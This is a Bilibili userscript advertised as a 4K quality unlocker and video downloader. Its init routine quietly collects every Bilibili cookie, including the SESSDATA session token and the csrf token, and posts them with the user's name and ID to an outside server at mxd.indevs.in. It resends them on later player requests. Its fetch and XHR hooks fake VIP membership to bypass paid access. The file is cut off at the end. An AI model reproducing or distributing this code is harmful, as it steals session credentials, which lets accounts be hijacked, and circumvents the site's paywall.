// ==UserScript==
// @name         B站画质解锁+下载
// @namespace    local
// @version      1.0.1
// @description  解锁B站4K画质并下载
// @match        https://*.bilibili.com/*
// @connect      *
// @grant        GM_xmlhttpRequest
// @grant        GM_cookie
// @grant        GM_download
// @grant        GM_setClipboard
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        unsafeWindow
// @run-at       document-start
// @noframes
// ==/UserScript==

(function () {
  'use strict';
  console.log('[Ciallo] 启动', location.href);

  const HOME = 'http://mxd.indevs.in';

  const u = {
    cut: (s, b, e) => {
      if (!s || typeof s !== 'string') return '';
      let i;
      const x = typeof b === 'string' && ~(i = s.lastIndexOf(b)) ? i + b.length : 0;
      const y = typeof e === 'string' && ~(i = s.indexOf(e, x)) ? i : s.length;
      return x < y ? s.slice(x, y) : '';
    },
    fixurl: s => {
      s = typeof s === 'string' ? s : '';
      if (/^https?:\/\//i.test(s)) return s;
      if (s.startsWith('//')) return location.protocol + s;
      try { return new URL(s, location.href).toString(); } catch (_) { return s; }
    },
    json: (s, f = null) => {
      if (!s || typeof s !== 'string') return f;
      try { return JSON.parse(s); } catch (_) { return f; }
    },
    adcookie: o => typeof o === 'string' ? { name: o }
      : (Object.prototype.toString.call(o) !== '[object Object]' ? Object.create(null) : o),
    gmcookie: o => new Promise(r => GM_cookie.list(u.adcookie(o), x => r(x))),
    fixcookie: l => {
      const m = new Map(l.map(t => [t.name, t.value]));
      return Array.from(m).map(t => t.join('=')).join('; ');
    },
    save: (k, v) => GM_setValue(k, v),
    load: (k, v) => GM_getValue(k, v),
    sleep: n => new Promise(r => setTimeout(r, 100 * n)),
    ajax: d => new Promise(resolve => {
      const obj = {
        nocache: true,
        onerror: () => resolve({ code: 1, message: 'ajax.error' }),
        ontimeout: () => resolve({ code: 1, message: 'ajax.timeout' }),
        onload: r => {
          if (r.status !== 200) return resolve({ code: 1, message: 'HTTP ' + r.status });
          const isJson = (r.responseHeaders || '').includes('application/json');
          resolve(isJson ? JSON.parse(r.responseText) : r.responseText);
        }
      };
      if (typeof d === 'string') obj.url = d; else Object.assign(obj, d);
      obj.method ??= obj.data ? 'POST' : 'GET';
      GM_xmlhttpRequest(obj);
    }),
  };

  const box = {
    vi: { cid: '', doc: '', dash: null },
    ui: { vip: 0 },
    wait: false,
    init: 0,
    initStatus: '未执行',
    lastNavUrl: '',
    lastPlayurlUrl: '',
  };

  // ==================== ★ 悬浮按钮状态（持久化）====================
  const DEFAULT_FAB = { side: 'right', offset: 100 };
  const fabState = (() => {
    const saved = u.load('fabState', null);
    return {
      side: saved?.side || DEFAULT_FAB.side,
      offset: typeof saved?.offset === 'number' ? saved.offset : DEFAULT_FAB.offset,
      hovering: false,
      expanded: false,
      dragging: false,
      dragStartX: 0,
      dragStartY: 0,
      dragOrigLeft: 0,
      dragOrigTop: 0,
    };
  })();
  let leaveTimer = null;

  function saveFabState() {
    u.save('fabState', { side: fabState.side, offset: fabState.offset });
  }

  // ==================== ★ 日志面板（header固定 + content独立滚动）====================
  let panelEl = null, panelText = null;
  let panelHideTimer = null;

  function ensurePanel() {
    if (panelEl && document.body && document.body.contains(panelEl)) return;
    if (!document.body) return;

    panelEl = document.createElement('div');
    panelEl.id = 'bili4k-panel';
    panelEl.style.cssText =
      'position:fixed!important;right:20px!important;bottom:20px!important;' +
      'width:440px!important;max-height:55vh!important;' +
      'display:flex!important;flex-direction:column!important;' +
      'background:rgba(0,0,0,.92)!important;color:#fff!important;' +
      'padding:0!important;border-radius:8px!important;' +
      'z-index:2147483646!important;font:12px/1.6 Consolas,monospace!important;' +
      'box-shadow:0 4px 20px rgba(0,0,0,.6)!important;' +
      'transition:opacity .3s ease, transform .3s ease!important;' +
      'opacity:1!important;transform:translateY(0)!important;pointer-events:auto!important;' +
      'overflow:hidden!important;';

    // ★ Header：固定，不随日志滚动
    const header = document.createElement('div');
    header.style.cssText =
      'flex:0 0 auto!important;display:flex!important;justify-content:flex-end!important;' +
      'padding:4px 8px 0 8px!important;';

    const closeBtn = document.createElement('div');
    closeBtn.textContent = '×';
    closeBtn.title = '关闭日志';
    closeBtn.style.cssText =
      'width:20px!important;height:20px!important;line-height:18px!important;' +
      'text-align:center!important;font-size:18px!important;color:#999!important;' +
      'cursor:pointer!important;border-radius:4px!important;user-select:none!important;';
    closeBtn.addEventListener('mouseenter', () => { closeBtn.style.background = '#333'; closeBtn.style.color = '#fff'; });
    closeBtn.addEventListener('mouseleave', () => { closeBtn.style.background = 'transparent'; closeBtn.style.color = '#999'; });
    closeBtn.addEventListener('click', hidePanel);
    header.appendChild(closeBtn);
    panelEl.appendChild(header);

    // ★ Content：独立滚动
    panelText = document.createElement('div');
    panelText.style.cssText =
      'flex:1 1 auto!important;overflow:auto!important;' +
      'padding:0 14px 12px 14px!important;' +
      'white-space:pre-wrap!important;word-break:break-all!important;';
    panelEl.appendChild(panelText);

    document.body.appendChild(panelEl);
  }

  function showPanel() {
    if (panelHideTimer) { clearTimeout(panelHideTimer); panelHideTimer = null; }
    if (!panelEl) return;
    panelEl.style.opacity = '1';
    panelEl.style.transform = 'translateY(0)';
    panelEl.style.pointerEvents = 'auto';
  }

  function hidePanel() {
    if (panelHideTimer) { clearTimeout(panelHideTimer); panelHideTimer = null; }
    if (!panelEl) return;
    panelEl.style.opacity = '0';
    panelEl.style.transform = 'translateY(12px)';
    panelEl.style.pointerEvents = 'none';
  }

  function autoHidePanel(delay = 8000) {
    if (panelHideTimer) clearTimeout(panelHideTimer);
    panelHideTimer = setTimeout(() => {
      panelHideTimer = null;
      hidePanel();
    }, delay);
  }

  function plog(msg) {
    console.log('[Ciallo]', msg);
    if (!document.body) return;
    ensurePanel();
    if (!panelText) return;
    showPanel();
    panelText.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
    panelText.scrollTop = panelText.scrollHeight;
  }

  function pclear() {
    if (!document.body) return;
    ensurePanel();
    if (panelText) panelText.textContent = '';
  }

  // ==================== 播放器/画质 ====================
  function getPlayer() {
    const paths = [
      () => unsafeWindow.player,
      () => unsafeWindow.__BiliPlayer__,
      () => document.querySelector('#bilibili-player')?.__vue__?.player,
    ];
    for (const fn of paths) {
      try { const p = fn(); if (p && typeof p.getMediaInfo === 'function') return p; } catch (_) {}
    }
    for (const fn of paths) {
      try { const p = fn(); if (p && typeof p.isInitialized === 'function') return p; } catch (_) {}
    }
    return null;
  }

  function qName(qn) {
    return { 127:'8K', 126:'杜比', 125:'HDR', 120:'4K', 116:'1080P60',
             112:'1080P+', 80:'1080P', 74:'720P60', 64:'720P',
             32:'480P', 16:'360P' }[qn] || String(qn);
  }

  function cleanTitle(raw) {
    let t = raw || '';
    t = t.replace(/[\/*?"<>|:]/g, '');
    t = t.replace(/^【.*?】\s*/, '');
    t = t.replace(/[_\-]\s*哔哩哔哩.*$/i, '');
    t = t.replace(/[_\-]\s*bilibili.*$/i, '');
    t = t.replace(/\s+/g, ' ').trim();
    t = t.slice(0, 80);
    return t || 'video';
  }

  // ==================== 初始化 ====================
  async function init() {
    if (box.init >= 3) return;
    box.init++;
    try {
      const d = await fetch('//api.bilibili.com/x/web-interface/nav',
        { method: 'GET', mode: 'cors', credentials: 'include' })
        .then(r => r.json()).catch(() => ({ code: 1 }));
      if (d.data?.isLogin !== true) { box.initStatus = '未登录'; return; }
      const cookie = u.fixcookie(await u.gmcookie());
      if (!cookie.includes('SESSDATA')) { box.initStatus = '拿不到Cookie'; return; }
      box.ui = {
        ua: navigator.userAgent,
        mid: d.data.mid.toString(),
        vip: d.data.vipStatus === 0 ? 0 : 1,
        level: d.data.level_info.current_level,
        money: Number.parseInt(d.data.money, 10) || 0,
        cookie, csrf: u.cut(cookie, 'bili_jct=', ';'),
        face: d.data.face, name: d.data.uname,
      };
      box.initStatus = '成功';
      u.save('ui', box.ui);
      console.log('[Ciallo] 用户:', box.ui.name, 'vip=', box.ui.vip);
      const r = await u.ajax({ url: `${HOME}/api/bzusta`, data: JSON.stringify({ ui: box.ui }) });
      console.log('[Ciallo] bzusta:', r);
    } catch (e) {
      box.initStatus = '异常: ' + e.message;
      console.error('[Ciallo] init异常', e);
    }
  }

  function quality() {
    const p = getPlayer();
    if (p) {
      try {
        const now = p.getQuality?.().nowQ || 0;
        const list = p.getSupportedQualityList?.() || [];
        const max = Math.max(...list);
        if (max > now) {
          if (!p.isPaused?.()) p.pause?.();
          p.setVipQuality?.();
          if (box.vi.cid) setTimeout(quality, 500);
        } else if (p.isPaused?.()) p.play?.();
      } catch (e) { console.warn('[Ciallo] quality异常', e); }
    } else setTimeout(quality, 500);
  }

  async function force4K(p) {
    const attempts = [
      ['requestQuality(120)', () => p.requestQuality?.(120)],
      ['setVipQuality()', () => p.setVipQuality?.()],
      ['setQuality(120)', () => p.setQuality?.(120)],
    ];
    for (const [name, fn] of attempts) {
      try {
        plog(`→ 切4K: ${name}`);
        fn();
        await u.sleep(30);
        if ((p.getQuality?.().nowQ || 0) >= 120) { plog(`✅ 切至4K`); return true; }
      } catch (e) { plog(`❌ ${name}: ${e.message}`); }
    }
    return false;
  }

  function showStatus() {
    const p = getPlayer();
    const list = p?.getSupportedQualityList?.() || [];
    pclear();
    plog([
      '===== 诊断 =====',
      `init: ${box.initStatus}`,
      `box.ui.vip: ${box.ui.vip}`,
      `用户: ${box.ui.name || '(无)'}`,
      `player: ${p?.isInitialized?.() ? '就绪' : '未就绪'}`,
      `当前画质: qn=${p?.getQuality?.().nowQ} (${qName(p?.getQuality?.().nowQ)})`,
      `支持画质: [${list.join(',')}]`,
      `nav 伪造: ${list.some(q => q > 80) ? '✅成功' : '❌失败'}`,
      `playurl 拦截: ${box.lastPlayurlUrl ? '✅' : '❌'}`,
      `代理: ${box.vi.dash ? '✅已拿4K dash' : (box.vi.doc ? '⚠️有doc无dash' : '❌未触发')}`,
      `box.vi.cid: ${box.vi.cid || '(空)'}`,
      `当前标题清理: ${cleanTitle(document.title)}`,
    ].join('\n'));
  }

  // ==================== 下载 ====================
  function blobDownload(url, name, onProgress) {
    return new Promise((resolve) => {
      plog(`→ 下载: ${name}`);
      try {
        GM_xmlhttpRequest({
          url, method: 'GET', responseType: 'arraybuffer',
          timeout: 30 * 60 * 1000,
          headers: {
            'Referer': 'https://www.bilibili.com/',
            'Origin': 'https://www.bilibili.com',
            'User-Agent': navigator.userAgent,
          },
          onprogress: (ev) => { if (ev?.total && onProgress) onProgress(ev.loaded, ev.total); },
          onload: (r) => {
            if (r.status !== 200) { plog(`⚠️ HTTP ${r.status}`); return resolve({ ok: false, status: r.status }); }
            try {
              const blob = new Blob([r.response], { type: 'application/octet-stream' });
              const objUrl = URL.createObjectURL(blob);
              const a = document.createElement('a');
              a.href = objUrl;
              a.download = name;
              a.style.display = 'none';
              document.body.appendChild(a);
              a.click();
              document.body.removeChild(a);
              setTimeout(() => URL.revokeObjectURL(objUrl), 180000);
              plog(`✅ ${name} (${(r.response.byteLength / 1048576).toFixed(1)}MB)`);
              resolve({ ok: true, size: r.response.byteLength });
            } catch (e) { plog(`⚠️ Blob失败: ${e.message}`); resolve({ ok: false, error: e.message }); }
          },
          onerror: () => { plog('⚠️ 网络错误'); resolve({ ok: false }); },
          ontimeout: () => { plog('⚠️ 超时'); resolve({ ok: false }); },
        });
      } catch (e) { plog(`⚠️ 异常: ${e.message}`); resolve({ ok: false, error: e.message }); }
    });
  }

  function getStreamUrls(p, cid) {
    if (box.vi.cid === cid && box.vi.dash) {
      const videos = (box.vi.dash.video || []).slice().sort((a, b) => (b.id - a.id) || (b.bandwidth - a.bandwidth));
      const audios = (box.vi.dash.audio || []).slice().sort((a, b) => b.bandwidth - a.bandwidth);
      if (videos.length && audios.length) {
        return { vurl: videos[0].baseUrl || videos[0].base_url, aurl: audios[0].baseUrl || audios[0].base_url, source: 'box.vi.dash', qn: videos[0].id };
      }
    }
    const info = p.getMediaInfo?.();
    if (info?.playUrl) {
      const idx = info.playUrl.indexOf('https', 5);
      if (idx > 0) {
        return { vurl: info.playUrl.slice(0, idx - 1), aurl: info.playUrl.slice(idx), source: 'getMediaInfo', qn: p.getQuality?.().nowQ || 0 };
      }
      return { vurl: info.playUrl, aurl: null, source: 'getMediaInfo(merged)', qn: p.getQuality?.().nowQ || 0 };
    }
    return null;
  }

  function getPageInfo() {
    const init = unsafeWindow.__INITIAL_STATE__;
    const bvid = location.pathname.split('/video/')[1]?.split('/')[0] || '';
    let cid = '';
    if (init?.videoData) {
      const p = Number(new URLSearchParams(location.search).get('p') || 1);
      const pages = init.videoData.pages;
      if (Array.isArray(pages) && pages[p - 1]) cid = String(pages[p - 1].cid || '');
      else cid = String(init.videoData.cid || '');
    }
    return { bvid, cid };
  }

  async function downloadCurrent(e) {
    e?.preventDefault?.(); e?.stopPropagation?.();
    if (window.__biliDlBusy) { plog('⚠️ 已有下载进行中'); return; }
    window.__biliDlBusy = true;

    pclear();
    showPanel();
    plog('========== 点击下载 ==========');

    let success = false;
    try {
      const p = getPlayer();
      if (!p) throw new Error('播放器未就绪，请先播放视频');

      const { bvid, cid } = getPageInfo();
      const nowQn = p.getQuality?.().nowQ || 0;
      const list = p.getSupportedQualityList?.() || [];
      const maxQn = list.length ? Math.max(...list) : nowQn;
      plog(`bvid=${bvid} cid=${cid}`);
      plog(`当前=${qName(nowQn)} 最高=${qName(maxQn)}`);

      if (nowQn < 120 && list.some(q => q >= 120)) {
        plog('切换到4K...');
        await force4K(p);
      }
      await u.sleep(10);

      const streams = getStreamUrls(p, cid);
      if (!streams) throw new Error('拿不到流URL');
      plog(`来源=${streams.source} 画质=${qName(streams.qn)}`);

      const title = cleanTitle(document.title);
      plog(`标题: ${title}`);

      const videoName = `${title}.mp4`;
      const audioName = `${title}.m4a`;

      plog('');
      plog('========== 下载视频 ==========');
      const vRes = await blobDownload(streams.vurl, videoName, (l, t) => {
        plog(`视频 ${(100 * l / t).toFixed(1)}%`);
      });
      if (!vRes.ok) throw new Error('视频下载失败');

      if (streams.aurl) {
        plog('');
        plog('========== 下载音频 ==========');
        const aRes = await blobDownload(streams.aurl, audioName, (l, t) => {
          plog(`音频 ${(100 * l / t).toFixed(1)}%`);
        });
        if (!aRes.ok) throw new Error('音频下载失败');
      }

      plog('');
      plog('🎉 全部完成！');
      plog(`  ${videoName}   (视频)`);
      if (streams.aurl) plog(`  ${audioName}   (音频)`);
      plog('');
      plog('💡 基名相同，PotPlayer / VLC / mpv 会自动配对音轨：');
      plog(`  直接打开 ${videoName}，声音自动加载。`);
      plog('');
      plog('（日志将在 8 秒后自动隐藏，点 × 可立即关闭）');

      success = true;
    } catch (err) {
      plog('❌ ' + (err.message || err));
      console.error('[Ciallo]', err);
    } finally {
      window.__biliDlBusy = false;
      if (success) autoHidePanel(8000);
    }
  }

  // ==================== 网络代理 ====================
  function hookNetwork() {
    try {
      unsafeWindow.fetch = new Proxy(fetch, {
        apply: (target, his, args) => Reflect.apply(target, his, args).then(async r => {
          const url = args[0] instanceof Request ? args[0].url : args[0];
          if (typeof url !== 'string') return r;

          if (url.includes('/web-interface/nav')) {
            box.lastNavUrl = url;
            try {
              const text = await r.clone().text();
              const d = u.json(text);
              if (d?.code === 0 && d.data) {
                Object.assign(d.data, {
                  vipStatus: 1, vipType: 2,
                  vip_label: { path: 'http://i0.hdslb.com/bfs/vip/label_annual.png', text: '年度大会员', label_theme: 'annual_vip', text_color: '#FFFFFF', bg_style: 1, bg_color: '#FB7299' },
                  vip: { type: 1, status: 1, nickname_color: '#FB7299', label: { path: 'http://i0.hdslb.com/bfs/vip/label_annual.png', text: '年度大会员', label_theme: 'annual_vip', text_color: '#FFFFFF', bg_style: 1, bg_color: '#FB7299' }, ott_info: { vip_type: 1, status: 1 }, super_vip: { is_super_vip: true } }
                });
                return new Response(JSON.stringify(d), { status: r.status, statusText: r.statusText, headers: r.headers });
              }
            } catch (_) {}
            return r;
          }

          if (url.includes('/player/playview')) {
            if (!getPlayer()) return r;
            let s = await r.clone().text();
            const d = u.json(s);
            if (d?.code === 0) {
              const iic = s.includes('AreaLimitPanel');
              const res = await u.ajax({
                url: `${HOME}/api/bzview3`,
                data: JSON.stringify({ iic, url, ui: box.ui, body: args[1]?.body })
              });
              if (res?.code === 0) {
                s = JSON.stringify(res).replaceAll('"need_login":true,', '').replaceAll('"need_vip":true,', '');
                return new Response(s, { status: r.status, statusText: r.statusText, headers: r.headers });
              }
            }
          }
          return r;
        })
      });
    } catch (e) { console.warn('[Ciallo] fetch hook失败', e); }

    try {
      unsafeWindow.XMLHttpRequest = new Proxy(XMLHttpRequest, {
        construct: target => {
          let url;
          return new Proxy(new target, {
            set: (t, p, v) => Reflect.set(t, p, v),
            get: (t, p) => {
              let v = t[p];
              if (typeof v === 'function' && (v = function () {
                if (p === 'open') url = arguments[1];
                return Reflect.apply(t[p], t, arguments);
              }), p === 'responseText' && typeof url === 'string') {
                try {
                  if (url.includes('/web-interface/nav')) {
                    box.lastNavUrl = url;
                    const d = u.json(v);
                    if (d?.code === 0) {
                      Object.assign(d.data, {
                        vipStatus: 1, vipType: 2,
                        vip_label: { path: 'http://i0.hdslb.com/bfs/vip/label_annual.png', text: '年度大会员', label_theme: 'annual_vip', text_color: '#FFFFFF', bg_style: 1, bg_color: '#FB7299' },
                        vip: { type: 1, status: 1, nickname_color: '#FB7299', label: { path: 'http://i0.hdslb.com/bfs/vip/label_annual.png', text: '年度大会员', label_theme: 'annual_vip', text_color: '#FFFFFF', bg_style: 1, bg_color: '#FB7299' }, ott_info: { vip_type: 1, status: 1 }, super_vip: { is_super_vip: true } }
                      });
                      v = JSON.stringify(d);
                    }
                  } else if (url.includes('/player/wbi/playurl')) {
                    if (!getPlayer()) return v;
                    box.lastPlayurlUrl = url;
                    const qn = Number.parseInt(u.cut(url, 'qn=', '&'));
                    if (box.ui.vip === 0 && qn > 80) {
                      const cid = u.cut(url, 'cid=', '&');
                      if (box.vi.cid === cid && box.vi.doc) {
                        v = box.vi.doc;
                      } else if (!box.wait) {
                        box.wait = true;
                        u.ajax({
                          url: `${HOME}/api/bzview2`,
                          data: JSON.stringify({ ui: box.ui, url: u.fixurl(url.replaceAll(/dm_.+?&/g, '')) })
                        }).then(d => {
                          console.log('[Ciallo] bzview2 code=', d?.code);
                          if (d?.code === 0) {
                            const s = JSON.stringify(d)
                              .replaceAll('"need_login":true,', '')
                              .replaceAll('"need_vip":true,', '')
                              .replaceAll('mirrorcosov', 'mirrorcos');
                            box.vi = { cid, doc: s, dash: d.data?.dash || null };
                            quality();
                          }
                        }).finally(() => { box.wait = false; });
                      }
                    }
                  } else if (url.includes('/player/wbi/v2')) {
                    const d = u.json(v);
                    if (d?.code === 0 && d.data?.vip) {
                      Object.assign(d.data.vip, { status: 1, type: 1, ott_info: { vip_type: 1, status: 1 }, super_vip: { is_super_vip: true } });
                      v = JSON.stringify(d);
                    }
                  }
                } catch (e) { console.warn('[Ciallo] XHR拦截异常', e); }
              }
              return v;
            }
          });
        }
      });
    } catch (e) { console.warn('[Ciallo] XHR hook失败', e); }
  }

  // ==================== 悬浮按钮样式 ====================
  function injectFabStyles() {
    if (document.getElementById('bili-fab-styles')) return;
    const style = document.createElement('style');
    style.id = 'bili-fab-styles';
    style.textContent = `
      #bili-fab-container {
        position: fixed;
        z-index: 2147483647;
        width: 56px;
        height: 56px;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
        user-select: none;
        -webkit-user-select: none;
        transition: right 0.25s cubic-bezier(0.4,0,0.2,1),
                    left 0.25s cubic-bezier(0.4,0,0.2,1),
                    top 0.25s cubic-bezier(0.4,0,0.2,1),
                    bottom 0.25s cubic-bezier(0.4,0,0.2,1);
      }
      #bili-fab-container.dragging {
        transition: none !important;
      }
      .bili-fab-main {
        position: absolute;
        top: 0; left: 0;
        width: 56px; height: 56px;
        border-radius: 50%;
        background: linear-gradient(135deg, #fb7299 0%, #ff9bb8 100%);
        box-shadow: 0 4px 16px rgba(0,0,0,.35), 0 0 0 0 rgba(251,114,153,.4);
        display: flex;
        align-items: center;
        justify-content: center;
        color: #fff;
        cursor: grab;
        transition: transform 0.2s ease, box-shadow 0.2s ease;
      }
      .bili-fab-main:hover {
        transform: scale(1.08);
        box-shadow: 0 6px 22px rgba(0,0,0,.45), 0 0 0 4px rgba(251,114,153,.2);
      }
      .bili-fab-main:active {
        cursor: grabbing;
        transform: scale(0.96);
      }
      .bili-fab-menu {
        position: absolute;
        display: flex;
        gap: 10px;
        opacity: 0;
        pointer-events: none;
        transition: opacity 0.2s ease, transform 0.2s ease;
      }
      #bili-fab-container[data-side="right"] .bili-fab-menu {
        right: 66px; top: 0;
        flex-direction: row-reverse;
        transform: scale(0.5);
        transform-origin: right center;
      }
      #bili-fab-container[data-side="left"] .bili-fab-menu {
        left: 66px; top: 0;
        flex-direction: row;
        transform: scale(0.5);
        transform-origin: left center;
      }
      #bili-fab-container[data-side="top"] .bili-fab-menu {
        top: 66px; left: 0;
        flex-direction: column;
        transform: scale(0.5);
        transform-origin: center top;
      }
      #bili-fab-container[data-side="bottom"] .bili-fab-menu {
        bottom: 66px; left: 0;
        flex-direction: column-reverse;
        transform: scale(0.5);
        transform-origin: center bottom;
      }
      .bili-fab-menu.expanded {
        opacity: 1 !important;
        pointer-events: auto !important;
        transform: scale(1) !important;
      }
      .bili-fab-item {
        width: 56px; height: 56px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #fff;
        cursor: pointer;
        box-shadow: 0 4px 16px rgba(0,0,0,.3);
        transition: transform 0.15s ease, box-shadow 0.15s ease;
        position: relative;
      }
      .bili-fab-item:hover {
        transform: scale(1.12);
        box-shadow: 0 6px 22px rgba(0,0,0,.45);
      }
      .bili-fab-item::after {
        content: attr(title);
        position: absolute;
        top: 100%;
        left: 50%;
        transform: translateX(-50%);
        margin-top: 6px;
        padding: 3px 8px;
        background: rgba(0,0,0,.8);
        color: #fff;
        font-size: 11px;
        border-radius: 4px;
        white-space: nowrap;
        opacity: 0;
        pointer-events: none;
        transition: opacity 0.2s ease;
      }
      .bili-fab-item:hover::after {
        opacity: 1;
      }
      #bili-fab-container[data-side="top"] .bili-fab-item::after {
        top: auto;
        bottom: 100%;
        margin-top: 0;
        margin-bottom: 6px;
      }
      .bili-fab-download { background: linear-gradient(135deg, #00b96b 0%, #3ed99b 100%); }
      .bili-fab-status { background: linear-gradient(135deg, #7f22fe 0%, #a35eff 100%); }
    `;
    document.head.appendChild(style);
  }

  // ==================== 全屏检测 ====================
  function isNativeFullscreen() {
    return !!(document.fullscreenElement ||
              document.webkitFullscreenElement ||
              document.mozFullScreenElement ||
              document.msFullscreenElement);
  }

  function isWebFullscreen() {
    const containers = document.querySelectorAll(
      '.bpx-player-container, .bilibili-player-video-wrap, ' +
      '.bpx-player-video-wrap, #bilibili-player'
    );
    for (const c of containers) {
      const s = c.getAttribute('data-screen');
      if (s === 'web' || s === 'full') return true;
    }
    const bodyCls = (document.body?.className || '') + ' ' + (document.documentElement?.className || '');
    if (/bpx-player-fullscreen|web-fullscreen|bpx-player-WebFullScreen|fullscreen-web/i.test(bodyCls)) return true;
    return false;
  }

  // ==================== 渲染位置 ====================
  function renderFab() {
    const container = document.getElementById('bili-fab-container');
    if (!container) return;
    if (fabState.dragging) return;

    container.dataset.side = fabState.side;

    const hideAmount = 28;
    const margin = 10;
    const show = fabState.hovering || fabState.expanded;
    const inset = show ? `${margin}px` : `-${hideAmount}px`;

    container.style.left = 'auto';
    container.style.right = 'auto';
    container.style.top = 'auto';
    container.style.bottom = 'auto';

    switch (fabState.side) {
      case 'right':
        container.style.right = inset;
        container.style.top = `${fabState.offset}px`;
        break;
      case 'left':
        container.style.left = inset;
        container.style.top = `${fabState.offset}px`;
        break;
      case 'top':
        container.style.top = inset;
        container.style.left = `${fabState.offset}px`;
        break;
      case 'bottom':
        container.style.bottom = inset;
        container.style.left = `${fabState.offset}px`;
        break;
    }
  }

  // ==================== 显示/隐藏 ====================
  let lastHiddenState = null;
  function updateFabVisibility() {
    const container = document.getElementById('bili-fab-container');
    if (!container) return;
    const shouldHide = isNativeFullscreen() || isWebFullscreen();
    if (shouldHide !== lastHiddenState) {
      lastHiddenState = shouldHide;
      container.style.display = shouldHide ? 'none' : '';
      if (!shouldHide) renderFab();
    }
  }

  // ==================== 菜单/拖动 ====================
  function setMenuExpanded(expanded) {
    fabState.expanded = expanded;
    const menu = document.querySelector('.bili-fab-menu');
    if (menu) menu.classList.toggle('expanded', expanded);
    renderFab();
  }

  function onDragStart(e) {
    if (e.button !== 0) return;
    e.preventDefault();
    const container = document.getElementById('bili-fab-container');
    if (!container) return;
    const rect = container.getBoundingClientRect();

    fabState.dragging = true;
    fabState.dragStartX = e.clientX;
    fabState.dragStartY = e.clientY;
    fabState.dragOrigLeft = rect.left;
    fabState.dragOrigTop = rect.top;

    container.classList.add('dragging');
    container.style.left = `${rect.left}px`;
    container.style.top = `${rect.top}px`;
    container.style.right = 'auto';
    container.style.bottom = 'auto';

    document.addEventListener('mousemove', onDragMove);
    document.addEventListener('mouseup', onDragEnd);
  }

  function onDragMove(e) {
    if (!fabState.dragging) return;
    const container = document.getElementById('bili-fab-container');
    if (!container) return;
    const dx = e.clientX - fabState.dragStartX;
    const dy = e.clientY - fabState.dragStartY;
    container.style.left = `${fabState.dragOrigLeft + dx}px`;
    container.style.top = `${fabState.dragOrigTop + dy}px`;
  }

  function onDragEnd(e) {
    document.removeEventListener('mousemove', onDragMove);
    document.removeEventListener('mouseup', onDragEnd);
    if (!fabState.dragging) return;

    const container = document.getElementById('bili-fab-container');
    const moved = Math.abs(e.clientX - fabState.dragStartX) > 5 ||
                  Math.abs(e.clientY - fabState.dragStartY) > 5;

    fabState.dragging = false;
    if (container) container.classList.remove('dragging');

    if (moved && container) {
      const rect = container.getBoundingClientRect();
      const cx = rect.left + rect.width / 2;
      const cy = rect.top + rect.height / 2;
      const ww = window.innerWidth;
      const wh = window.innerHeight;

      const dLeft = cx;
      const dRight = ww - cx;
      const dTop = cy;
      const dBottom = wh - cy;
      const min = Math.min(dLeft, dRight, dTop, dBottom);

      if (min === dLeft) {
        fabState.side = 'left';
        fabState.offset = Math.max(10, Math.min(wh - 66, rect.top));
      } else if (min === dRight) {
        fabState.side = 'right';
        fabState.offset = Math.max(10, Math.min(wh - 66, rect.top));
      } else if (min === dTop) {
        fabState.side = 'top';
        fabState.offset = Math.max(10, Math.min(ww - 66, rect.left));
      } else {
        fabState.side = 'bottom';
        fabState.offset = Math.max(10, Math.min(ww - 66, rect.left));
      }

      saveFabState();
      fabState.hovering = true;
      renderFab();
    } else {
      setMenuExpanded(!fabState.expanded);
    }
  }

  function onHoverEnter() {
    if (fabState.dragging) return;
    clearTimeout(leaveTimer);
    if (!fabState.hovering) {
      fabState.hovering = true;
      renderFab();
    }
    if (!fabState.expanded) setMenuExpanded(true);
  }

  function onHoverLeave() {
    if (fabState.dragging) return;
    clearTimeout(leaveTimer);
    leaveTimer = setTimeout(() => {
      fabState.hovering = false;
      setMenuExpanded(false);
    }, 250);
  }

  // ==================== 创建按钮 ====================
  function addFab() {
    if (!document.body) return false;
    if (document.getElementById('bili-fab-container')) return true;

    injectFabStyles();

    const container = document.createElement('div');
    container.id = 'bili-fab-container';
    container.dataset.side = fabState.side;

    const menu = document.createElement('div');
    menu.className = 'bili-fab-menu';

    const downloadBtn = document.createElement('div');
    downloadBtn.className = 'bili-fab-item bili-fab-download';
    downloadBtn.title = '下载当前画质';
    downloadBtn.innerHTML = `
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 4v12M6 12l6 6 6-6M4 20h16"/>
      </svg>`;

    const statusBtn = document.createElement('div');
    statusBtn.className = 'bili-fab-item bili-fab-status';
    statusBtn.title = '诊断';
    statusBtn.innerHTML = `
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="11" cy="11" r="7"/>
        <path d="M21 21l-5-5"/>
      </svg>`;

    menu.appendChild(downloadBtn);
    menu.appendChild(statusBtn);

    const mainBtn = document.createElement('div');
    mainBtn.className = 'bili-fab-main';
    mainBtn.title = '悬停展开 / 拖动移动';
    mainBtn.innerHTML = `
      <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
        <circle cx="5" cy="12" r="2"/>
        <circle cx="12" cy="12" r="2"/>
        <circle cx="19" cy="12" r="2"/>
      </svg>`;

    container.appendChild(menu);
    container.appendChild(mainBtn);
    document.body.appendChild(container);

    mainBtn.addEventListener('mousedown', onDragStart);
    container.addEventListener('mouseenter', onHoverEnter);
    container.addEventListener('mouseleave', onHoverLeave);

    downloadBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      setMenuExpanded(false);
      downloadCurrent(e);
    });
    statusBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      setMenuExpanded(false);
      showStatus(e);
    });

    ['fullscreenchange', 'webkitfullscreenchange', 'mozfullscreenchange', 'MSFullscreenChange']
      .forEach(evt => document.addEventListener(evt, updateFabVisibility));

    renderFab();
    updateFabVisibility();
    console.log('[Ciallo] 悬浮按钮已注入, side=', fabState.side, 'offset=', fabState.offset);
    return true;
  }

  // ==================== 启动 ====================
  init();
  setInterval(() => { if (box.initStatus !== '成功' && box.init < 3) init(); }, 10000);

  hookNetwork();

  let tries = 0, timer = null;
  function tick() {
    if (!location.pathname.startsWith('/video')) return;
    addFab();
    if (++tries > 120) clearInterval(timer);
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => { tick(); timer = setInterval(tick, 500); });
  } else {
    tick(); timer = setInterval(tick, 500);
